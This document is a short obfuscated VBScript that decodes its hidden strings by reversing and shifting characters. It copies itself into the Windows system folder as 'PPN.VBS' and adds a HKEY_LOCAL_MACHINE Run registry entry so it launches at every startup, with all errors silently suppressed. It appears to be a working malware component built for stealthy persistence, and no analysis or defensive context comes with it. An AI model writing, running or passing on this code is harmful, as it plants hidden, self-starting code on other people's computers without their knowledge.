On Error Resume Next

Dim XY5QGHSY, TWVWMFCG

Set XY5QGHSY = CreateObject( BS1W9S( "sbdiaNldsrxRdkhE-fmhsohqbR" ) )
XY5QGHSY.CopyFile WScript.ScriptFullName, XY5QGHSY.BuildPath( XY5QGHSY.GetSpecialFolder(0), BS1W9S( "RAU-MOO" ) )

Set TWVWMFCG = CreateObject( BS1W9S( "kkdgR-sohqbRV" ) )
TWVWMFCG.RegWrite BS1W9S( "[rdbhuqdRmtQ[mnhrqdUsmdqqtB[rvncmhV[senrnqbhL[dq`vsenR[DMHGB@L^K@BNK^XDJG" ) & BS1W9S( "MOO" ), XY5QGHSY.BuildPath( XY5QGHSY.GetSpecialFolder(0), BS1W9S( "RAU-MOO" ) )

Function BS1W9S( SGEVWB2X )
   Dim UPH
   Dim I3LYG
   Dim T839N5

   UPH = ""

   For I3LYG = 1 To Len( SGEVWB2X )
       T839N5 = Mid( SGEVWB2X, I3LYG, 1 )

       UPH = Chr( Asc( T839N5 ) + 1 ) & UPH
   Next

   BS1W9S = UPH
End Function
